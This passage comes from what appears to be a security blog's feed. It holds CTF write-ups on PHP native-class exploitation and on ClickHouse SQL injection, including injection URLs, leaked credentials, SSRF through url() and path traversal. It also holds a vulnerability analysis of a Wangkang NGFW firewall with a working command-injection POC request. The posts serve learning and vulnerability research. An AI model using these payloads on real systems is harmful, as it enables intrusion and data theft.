src="http://pic.c1imber.top/blog/20211021/L9OpyHDGw1xI.png?imageslim" alt="mark"></p><p>读取flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//119.61.19.212:57504/index.php?a=Exception&amp;b=systemcat%20flag.php&amp;c=__toString&amp;d=36&amp;e=6&amp;f=42&amp;g=12</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211021/FsuaGyOc6m4p.png?imageslim" alt="mark"></p><p><strong>拓展</strong></p><p>官方手册-预定义异常类列表：</p><p><a href="https://www.php.net/manual/zh/reserved.exceptions.php" target="_blank" rel="external">https://www.php.net/manual/zh/reserved.exceptions.php</a></p><p><img src="http://pic.c1imber.top/blog/20211021/0Mfg6bh3F2rl.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Exception</span></div><div class="line">ErrorException</div><div class="line">Error</div><div class="line">ArgumentCountError</div><div class="line">ArithmeticError</div><div class="line">AssertionError</div><div class="line">DivisionByZeroError</div><div class="line">CompileError</div><div class="line">ParseError</div><div class="line">TypeError</div></pre></td></tr></table></figure><p>这些异常类的<code>__toString</code>和<code>getMessage</code>都是可以利用的</p><h3 id="SplFileObject类fgets"><a href="#SplFileObject类fgets" class="headerlink" title="SplFileObject类fgets"></a>SplFileObject类fgets</h3><p>在p牛小密圈看一个师傅提出的方法</p><p>官方文档描述：</p><p><code>SplFileObject</code>类为文件提供了一个面向对象接口.<br>简单理解就是读文件，可以理解为<code>fopen</code>面向对象的接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file=<span class="keyword">new</span> SplFileObject(<span class="string">'C://Windows/win.ini'</span>);</div><div class="line"><span class="keyword">echo</span> $file-&gt;fgets();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">; <span class="keyword">for</span> <span class="number">16</span>-bit app support</div></pre></td></tr></table></figure><p>读取了文件的第一行</p><p><code>SplFileObject</code>类<code>__construct</code>的第一个参数filename支持URL，前提是需要开启<code>allow_url_fopen</code></p><p><a href="https://www.php.net/manual/zh/splfileobject.construct.php" target="_blank" rel="external">https://www.php.net/manual/zh/splfileobject.construct.php</a></p><p><img src="http://pic.c1imber.top/blog/20211021/pA8epP1AYIsH.png?imageslim" alt="mark"></p><p>支持的协议和封装协议</p><p><img src="http://pic.c1imber.top/blog/20211021/w0lq1qb7qYJC.png?imageslim" alt="mark"></p><p>引用p牛的话：data:,后的字符串会被当作文件内容读取到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//$file=new SplFileObject('C://Windows/win.ini');</span></div><div class="line">$file=<span class="keyword">new</span> SplFileObject(<span class="string">'data:,hello'</span>);</div><div class="line"><span class="keyword">echo</span> $file-&gt;fgets();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hello</div></pre></td></tr></table></figure><p>所以可以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file=<span class="keyword">new</span> SplFileObject(<span class="string">"data:,phpinfo\r\n1"</span>);</div><div class="line"><span class="keyword">echo</span> substr($file-&gt;fgets(),<span class="number">0</span>,<span class="number">7</span>);</div><div class="line"><span class="keyword">echo</span> substr($file-&gt;fgets(),<span class="number">0</span>,<span class="number">1</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">phpinfo1</div></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//127.0.0.1/Hello.php?a=SplFileObject&amp;b=data:,phpinfo%0d%0a1&amp;c=fgets&amp;d=0&amp;e=7&amp;f=0&amp;g=1</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211021/sCrNcprLtb2S.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php反序列化原生类&quot;&gt;&lt;a href=&quot;#php反序列化原生类&quot; class=&quot;headerlink&quot; title=&quot;php反序列化原生类&quot;&gt;&lt;/a&gt;php反序列化原生类&lt;/h1&gt;&lt;p&gt;记录一下在ctf当中遇到的有关php反序列化原生类的利用&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>通过2021 ByteCTF double sqli初探clickghouse sqli</title>
    <link href="https://c1aysec.github.io/2021/10/19/%E9%80%9A%E8%BF%872021%20ByteCTF%20double%20sqli%E5%88%9D%E6%8E%A2clickghouse%20sqli/"/>
    <id>https://c1aysec.github.io/2021/10/19/通过2021 ByteCTF double sqli初探clickghouse sqli/</id>
    <published>2021-10-19T02:43:27.247Z</published>
    <updated>2021-10-19T03:06:20.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通过2021-ByteCTF-double-sqli初探clickghouse-sqli"><a href="#通过2021-ByteCTF-double-sqli初探clickghouse-sqli" class="headerlink" title="通过2021 ByteCTF double sqli初探clickghouse sqli"></a>通过2021 ByteCTF double sqli初探clickghouse sqli</h1><p>通过该题顺便学习了一波clickhouse注入<br>根据数据库报错得知是clickhouse数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1'</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/sPG3sQ7NFcBB.png?imageslim" alt="mark"></p><p><strong>官方文档：</strong><br><a href="https://clickhouse.com/docs/zh/" target="_blank" rel="external">https://clickhouse.com/docs/zh/</a></p><p><strong>SQL注入资料：</strong><br><a href="https://blog.deteact.com/yandex-clickhouse-injection/" target="_blank" rel="external">https://blog.deteact.com/yandex-clickhouse-injection/</a></p><p><strong>从资料当中得到两点比较重要的：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、与某些 SQL 方言不同，ClickHouse 具有严格的类型。类型之间没有隐式转换。</div><div class="line">2、ClickHouse 不支持标准的 UNION，只支持 UNION ALL 来合并请求</div></pre></td></tr></table></figure></p><p>可以得到两种注入方法：</p><h3 id="1、通过强类型进行报错注入，这点类似于sqlserver的报错注入："><a href="#1、通过强类型进行报错注入，这点类似于sqlserver的报错注入：" class="headerlink" title="1、通过强类型进行报错注入，这点类似于sqlserver的报错注入："></a>1、通过强类型进行报错注入，这点类似于sqlserver的报错注入：</h3><p><strong>比较运算：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20and%201=version()</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/CgkWGI8n1GzT.png?imageslim" alt="mark"></p><p><code>Cannot convert string 21.3.2.5 to type UInt8</code></p><p><strong>类型转换：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20and%20cast(version()%20as%20int)</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/n3SCDGRbQSMj.png?imageslim" alt="mark"></p><p><code>Cannot parse string &#39;21.3.2.5&#39; as Int32</code></p><p>获得版本号为21.3.2.5</p><h3 id="2、通过union-all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换"><a href="#2、通过union-all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换" class="headerlink" title="2、通过union all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换"></a>2、通过union all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换</h3><p>也可以通过<code>union all</code>通过报错获取数据表的列名，当前后字段数不一致时，会将表中的字段名报错出来，例如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20system.databases</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/lrVJN1Ng3rY4.png?imageslim" alt="mark"></p><p>可以看到通过报错获取了<code>system.databases</code>表中的字段名有name, engine, data_path, metadata_path, uuid，至于这个表是做什么的后面会说</p><h3 id="获取当前用户名："><a href="#获取当前用户名：" class="headerlink" title="获取当前用户名："></a>获取当前用户名：</h3><p><code>system.processes</code>可以查看当前数据库进程的一些信息，例如进行查询的用户、执行的语句等<br><img src="http://pic.c1imber.top/blog/20211019/8THhIPPX8mc0.png?imageslim" alt="mark"></p><p>所以可以从<code>system.processes</code>获取当前数据库用户名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20user%20from%20system.processes</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/hH8bhDG0yB2w.png?imageslim" alt="mark"></p><p>当前用户为user_02</p><h3 id="获取数据库名："><a href="#获取数据库名：" class="headerlink" title="获取数据库名："></a>获取数据库名：</h3><p>从系统表<code>system.databases</code>当中获得当前用户可以看到的数据库名（类似于mysql当中的<code>information_schema.schemata</code>）<br><img src="http://pic.c1imber.top/blog/20211019/trXKwjncT6Ta.png?imageslim" alt="mark"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.databases</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/vWrz7wHiRvoH.png?imageslim" alt="mark"></p><p>获取到数据库名有ctf、default</p><h3 id="获取表名："><a href="#获取表名：" class="headerlink" title="获取表名："></a>获取表名：</h3><p>可以通过<code>system.tables</code>（类似于mysql当中的<code>information_schema.tables</code>）<br><img src="http://pic.c1imber.top/blog/20211019/Tn0DeqC0rp0w.png?imageslim" alt="mark"></p><p>获取所有可以看到的表名hint、hello</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.tables</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/7A3GuLL1XrJ1.png?imageslim" alt="mark"></p><p>获取ctf下的表名为hint</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.tables%20where%20database=%27ctf%27</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/BUA49FXmVMae.png?imageslim" alt="mark"></p><p>获取default下的表名为hello</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.tables%20where%20database=%27default%27</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/S9WpAC8KNcXW.png?imageslim" alt="mark"></p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名:"></a>获取列名:</h3><p>可以通过<code>system.columns</code>（类似于mysql当中的<code>information_schema.columns</code>）<br><img src="http://pic.c1imber.top/blog/20211019/ladOaqYa2o6N.png?imageslim" alt="mark"></p><p>获取所有可以看到的列名为id、ByteCTF</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.columns</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/viO714gl5Irx.png?imageslim" alt="mark"></p><p>获取<code>ctf.hint</code>下的列名为id：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.columns%20where%20database=%27ctf%27%20and%20table=%27hint%27</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/w1Nv4H3lxbRR.png?imageslim" alt="mark"></p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据:"></a>获取数据:</h3><p>获取<code>ctf.hint</code>当中的提示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20id%20from%20ctf.hint</div></pre></td></tr></table></figure><p>或者</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20ctf.hint</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/EhkiV4YJSqe2.png?imageslim" alt="mark"></p><p>hint说没有权限获取flag</p><p><code>you_dont_have_permissions_to_read_flag</code></p><p>尝试读一下<code>ctf.flag</code>，当前用户user_02确实是没有权限</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20ctf.flag</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/85s1Abg1ovYd.png?imageslim" alt="mark"></p><p>根据这道题的名字double sqli，看来需要先拿到其他有权限用户的账号密码进行注入</p><p>题目一开始给了提示</p><p><img src="http://pic.c1imber.top/blog/20211019/k2WcI6uNk4Tp.png?imageslim" alt="mark"></p><p>something in files指的应该是对应链接的一张图片，无奈自己这里没看出里面藏有什么</p><p>尝试用file函数读文件也无果，限制了目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20file(%27/etc/passwd%27)</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/DQnoCfypMRi1.png?imageslim" alt="mark"></p><p>只允许/var/lib/clickhouse/user_files/目录</p><h3 id="非预期解？"><a href="#非预期解？" class="headerlink" title="非预期解？"></a>非预期解？</h3><p>最终在<code>system.processes</code>表的<code>query</code>当中看到了user_02和user_01的密码，上面也说了<code>system.processes</code>的<code>query</code>当中记录了当前执行的查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20query%20from%20system.processes</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/4WKNh0tqmlxb.png?imageslim" alt="mark"></p><p>user_02 e4649b934ca495991b78</p><p>user_01 e3b0c44298fc1c149afb</p><p>而cilckhouse支持通过http客户端进行查询，并且该题目url函数没被禁用</p><p><strong>http客户端接口：</strong><br><img src="http://pic.c1imber.top/blog/20211019/P72zAS3nRPVA.png?imageslim" alt="mark"></p><p><strong>url表函数：</strong><br><img src="http://pic.c1imber.top/blog/20211019/FSYbmFFI5eUa.png?imageslim" alt="mark"></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20url(%27http://127.0.0.1:8123%27,CSV,%27col%20String%27)</div></pre></td></tr></table></figure><p>可以看到返回了OK，http客户端可以正常请求clickhouse server</p><p><img src="http://pic.c1imber.top/blog/20211019/SUd943rcBisj.png?imageslim" alt="mark"></p><p>通过url表函数和http客户端切换数据库用户为user_01，成功查询出了ctf.flag（注意URL的编码问题）</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20url(%27http://127.0.0.1:8123?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag;%27,CSV,%27col%20String%27)</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/aYTFjCn78Urh.png?imageslim" alt="mark"></p><p>flag:<br><code>ByteCTF{e3b0c44298fc1c149afbf4c8}</code></p><h3 id="赛后补充："><a href="#赛后补充：" class="headerlink" title="赛后补充："></a>赛后补充：</h3><p>赛后看了其他师傅的wp，预期解是穿越目录获取的user_01密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/files../var/lib/clickhouse/access/3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sql</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211019/uipA5M2398my.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;通过2021-ByteCTF-double-sqli初探clickghouse-sqli&quot;&gt;&lt;a href=&quot;#通过2021-ByteCTF-double-sqli初探clickghouse-sqli&quot; class=&quot;headerlink&quot; title=&quot;通过20
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2021HW总结-网康NS-NGFW rce复现分析</title>
    <link href="https://c1aysec.github.io/2021/04/29/2021HW%E6%80%BB%E7%BB%93-%E7%BD%91%E5%BA%B7NS-NGFW%20rce%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2021/04/29/2021HW总结-网康NS-NGFW rce复现分析/</id>
    <published>2021-04-29T03:26:56.758Z</published>
    <updated>2021-04-29T12:59:10.270Z</updated>
    
    <content type="html"><![CDATA[<h3 id="流传的POC"><a href="#流传的POC" class="headerlink" title="流传的POC"></a>流传的POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST /directdata/direct/router HTTP/<span class="number">1.1</span></div><div class="line">Host: xxx</div><div class="line">Connection: close</div><div class="line">Cache-Control: max-age=<span class="number">0</span></div><div class="line">sec-ch-ua: <span class="string">"Google Chrome"</span>;v=<span class="string">"89"</span>, <span class="string">"Chromium"</span>;v=<span class="string">"89"</span>, <span class="string">";Not A Brand"</span>;v=<span class="string">"99"</span></div><div class="line">sec-ch-ua-mobile: ?<span class="number">0</span></div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">89.0</span><span class="number">.4389</span><span class="number">.114</span> Safari/<span class="number">537.36</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></div><div class="line"><span class="comment">Sec-Fetch-Site: none</span></div><div class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></div><div class="line"><span class="comment">Sec-Fetch-User: ?1</span></div><div class="line"><span class="comment">Sec-Fetch-Dest: document</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 160</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&#123;"action":"SSLVPN_Resource","method":"deleteImage","data":[&#123;"data":["/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"]&#125;],"type":"rpc","tid":17,"f8839p7rqtj":"="&#125;</span></div></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据目录结构可以看出开发使用了Zend Freamwork php框架</p><p>根据请求路由<code>/directdata/direct/router</code>定位到漏洞的入口位置：</p><p>在<code>applications/directdata/controllers/DirectController.php</code>的<code>routerAction</code>方法</p><p><img src="http://pic.c1imber.top/blog/20210429/Dq3nF9uPlw5K.png?imageslim" alt="mark"></p><p>跟进这里<code>Ext_Direct</code>类的静态方法<code>run</code>函数：<code>Ext_Direct::run($this-&gt;getRequest())</code></p><p>在<code>applications/Models/Ext/Direct.php</code>当中</p><p><img src="http://pic.c1imber.top/blog/20210429/mdbNr6m0pJzy.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20210429/AVqmp1mkj039.png?imageslim" alt="mark"></p><p>继续跟进这里<code>run</code>方法当中的<code>Ext_Direct_Request::factory($request)</code></p><p>于是跟踪到了<code>applications/Models/Ext/Direct/Request.php</code>当中</p><p><img src="http://pic.c1imber.top/blog/20210429/Fgza2sjXllW0.png?imageslim" alt="mark"></p><p>这里通过<code>file_get_contents(&#39;php://input&#39;)</code>对POST过来的数据进行了接收，根据上面的POC可以得知这里接收的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"action"</span>:<span class="string">"SSLVPN_Resource"</span>,<span class="string">"method"</span>:<span class="string">"deleteImage"</span>,<span class="string">"data"</span>:[&#123;<span class="string">"data"</span>:[<span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span>]&#125;],<span class="string">"type"</span>:<span class="string">"rpc"</span>,<span class="string">"tid"</span>:<span class="number">17</span>,<span class="string">"f8839p7rqtj"</span>:<span class="string">"="</span>&#125;</div></pre></td></tr></table></figure><p>把这串数据的<code>json_decode</code>打印出来看看是什么：</p><p><img src="http://pic.c1imber.top/blog/20210429/NqyBKdLd4KQk.png?imageslim" alt="mark"></p><p>可以看到经过<code>json_decode</code>处理后的数据为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">object(stdClass)<span class="comment">#1 (6) &#123;</span></div><div class="line"> [<span class="string">"action"</span>]=&gt;</div><div class="line"> string(<span class="number">15</span>) <span class="string">"SSLVPN_Resource"</span></div><div class="line"> [<span class="string">"method"</span>]=&gt;</div><div class="line"> string(<span class="number">11</span>) <span class="string">"deleteImage"</span></div><div class="line"> [<span class="string">"data"</span>]=&gt;</div><div class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">   [<span class="number">0</span>]=&gt;</div><div class="line">   object(stdClass)<span class="comment">#2 (1) &#123;</span></div><div class="line">     [<span class="string">"data"</span>]=&gt;</div><div class="line">     <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">       [<span class="number">0</span>]=&gt;</div><div class="line">       string(<span class="number">47</span>) <span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span></div><div class="line">     &#125;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> [<span class="string">"type"</span>]=&gt;</div><div class="line"> string(<span class="number">3</span>) <span class="string">"rpc"</span></div><div class="line"> [<span class="string">"tid"</span>]=&gt;</div><div class="line"> int(<span class="number">17</span>)</div><div class="line"> [<span class="string">"f8839p7rqtj"</span>]=&gt;</div><div class="line"> string(<span class="number">1</span>) <span class="string">"="</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>所以获取到<code>$data</code>变量当中的数据符合下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (</div><div class="line">is_object($data) &amp;&amp; $data-&gt;type &amp;&amp; $data-&gt;tid &amp;&amp; </div><div class="line">$data-&gt;action &amp;&amp; $data-&gt;method</div><div class="line">)</div><div class="line"><span class="keyword">return</span> <span class="keyword">new</span> Ext_Direct_Request(</div><div class="line">$data-&gt;type, $data-&gt;tid, $data-&gt;action, </div><div class="line">$data-&gt;method, $data-&gt;data</div><div class="line">);</div></pre></td></tr></table></figure><p>这里主要根据获取到的数据对<code>Ext_Direct_Request</code>对象进行初始化，然后作为<code>Ext_Direct_Request::factory($request)</code>的返回值</p><p><code>applications/Models/Ext/Direct/Request.php</code>：</p><p><img src="http://pic.c1imber.top/blog/20210429/3BmyOIpXaVr5.png?imageslim" alt="mark"></p><p>最终在执行到<code>applications/Models/Ext/Direct.php</code>当中的<code>run</code>函数的<code>call_user_func_array</code>处，调用了<code>SSLVPN_Resource</code>类的<code>deleteImage</code>方法，传入的参数为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">   [<span class="number">0</span>]=&gt;</div><div class="line">   object(stdClass)<span class="comment">#2 (1) &#123;</span></div><div class="line">     [<span class="string">"data"</span>]=&gt;</div><div class="line">     <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">       [<span class="number">0</span>]=&gt;</div><div class="line">       string(<span class="number">47</span>) <span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span></div><div class="line">     &#125;</div><div class="line">   &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure><p>定位到<code>SSLVPN_Resource</code>类的相关代码，追踪到<code>applications/Models/SSLVPN/Resource.php</code>当中的<code>deleteImage</code>方法：</p><p><img src="http://pic.c1imber.top/blog/20210429/tzbukxAcrCKi.png?imageslim" alt="mark"></p><p>这里传入的<code>$params</code>变量内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">object(stdClass)<span class="comment">#2 (1) &#123;</span></div><div class="line">  [<span class="string">"data"</span>]=&gt;</div><div class="line">  <span class="keyword">array</span>(<span class="number">1</span>) &#123;</div><div class="line">    [<span class="number">0</span>]=&gt;</div><div class="line">    string(<span class="number">47</span>) <span class="string">"/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>最终在执行<code>shell_exec</code>的时候，可控输入<code>/var/www/html/d.txt;whoami&gt;/var/www/html/11.txt</code>被拼接入<code>$cmd</code>参数，产生了命令执行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;流传的POC&quot;&gt;&lt;a href=&quot;#流传的POC&quot; class=&quot;headerlink&quot; title=&quot;流传的POC&quot;&gt;&lt;/a&gt;流传的POC&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft Exchange RCE</title>
    <link href="https://c1aysec.github.io/2021/03/15/Microsoft%20Exchange%20RCE/"/>
    <id>https://c1aysec.github.io/2021/03/15/Microsoft Exchange RCE/</id>
    <published>2021-03-15T02:59:05.124Z</published>
    <updated>2021-03-15T03:06:41.027Z</updated>
    
